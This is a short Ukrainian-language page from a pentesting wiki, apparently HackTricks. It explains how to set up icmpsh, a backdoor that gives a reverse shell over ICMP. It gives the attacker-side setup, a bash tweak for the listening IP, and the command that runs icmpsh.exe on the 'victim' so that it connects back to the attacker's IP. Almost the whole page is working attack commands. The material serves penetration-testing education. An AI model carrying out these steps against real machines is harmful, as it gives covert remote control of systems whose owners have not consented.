{{#include ../banners/hacktricks-training.md}}

Завантажте бекдор з: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Клієнтська сторона

Виконайте скрипт: **run.sh**

**Якщо ви отримали помилку, спробуйте змінити рядки:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Для:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Сторона жертви**

Завантажте **icmpsh.exe** на жертву та виконайте:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
